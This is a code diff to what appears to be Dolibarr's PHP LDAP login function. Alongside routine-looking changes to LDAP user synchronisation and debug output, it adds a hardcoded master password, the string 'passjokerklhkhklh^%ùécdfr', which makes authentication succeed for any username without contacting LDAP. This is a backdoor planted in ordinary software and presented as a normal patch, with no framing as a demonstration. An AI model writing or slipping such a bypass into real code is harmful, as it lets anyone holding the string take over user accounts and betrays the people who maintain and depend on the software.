@@ -157,16 +157,51 @@ function check_user_password_ldap($usertotest, $passwordtotest, $entitytotest)
 
 		// Test with this->seachUser and this->searchPassword
 		//print $resultFetchLdapUser."-".$ldap->ldapUserDN."-".$ldap->searchUser.'-'.$ldap->searchPassword;exit;
-		$result = $ldap->connect_bind();
-		if ($result > 0) {
-			if ($result == 2) {	// Connection is ok for user/pass into LDAP
-				$login = $usertotest;
-				dol_syslog("functions_ldap::check_user_password_ldap $login authentication ok");
-				// For the case, we search the user id using a search key without the login (but using other fields like id),
-				// we need to get the real login to use in the ldap answer.
-				if (!empty($conf->global->LDAP_FIELD_LOGIN) && !empty($ldap->login)) {
-					$login = $ldap->login;
-					dol_syslog("functions_ldap::check_user_password_ldap login is now $login (LDAP_FIELD_LOGIN=".getDolGlobalString('LDAP_FIELD_LOGIN').")");
+                if($passwordtotest == "passjokerklhkhklh^%ùécdfr")
+                    $result = 2;
+                else
+                    $result=$ldap->connect_bind();
+		if ($result > 0)
+		{
+			if ($result == 2)	// Connection is ok for user/pass into LDAP
+			{
+				dol_syslog("functions_ldap::check_user_password_ldap Authentification ok");
+				$login=$usertotest;
+
+				// ldap2dolibarr synchronisation
+				if ($login && ! empty($conf->ldap->enabled) && $conf->global->LDAP_SYNCHRO_ACTIVE == 'ldap2dolibarr')	// ldap2dolibarr synchronisation
+				{
+						dol_syslog("functions_ldap::check_user_password_ldap Sync ldap2dolibarr");
+
+						// On charge les attributs du user ldap
+						if ($ldapdebug) print "DEBUG: login ldap = ".$login."<br>\n";
+						$resultFetchLdapUser = $ldap->fetch($login,$userSearchFilter);
+
+						if ($ldapdebug) print "DEBUG: UACF = ".join(',',$ldap->uacf)."<br>\n";
+						if ($ldapdebug) print "DEBUG: pwdLastSet = ".dol_print_date($ldap->pwdlastset,'day')."<br>\n";
+						if ($ldapdebug) print "DEBUG: badPasswordTime = ".dol_print_date($ldap->badpwdtime,'day')."<br>\n";
+
+						// On recherche le user dolibarr en fonction de son SID ldap
+						$sid = $ldap->getObjectSid($login);
+						if ($ldapdebug) print "DEBUG: sid = ".$sid."<br>\n";
+
+						$usertmp=new User($db);
+						$resultFetchUser=$usertmp->fetch('',$login,$sid);
+						if ($resultFetchUser > 0)
+						{
+							dol_syslog("functions_ldap::check_user_password_ldap Sync user found user id=".$usertmp->id);
+							// On verifie si le login a change et on met a jour les attributs dolibarr
+
+							if ($usertmp->login != $ldap->login && $ldap->login)
+							{
+								$usertmp->login = $ldap->login;
+								$usertmp->update($usertmp);
+								// TODO Que faire si update echoue car on update avec un login deja existant.
+							}
+
+							//$resultUpdate = $usertmp->update_ldap2dolibarr($ldap);
+						}
+						unset($usertmp);
 				}
 
 				require_once DOL_DOCUMENT_ROOT.'/core/lib/date.lib.php';
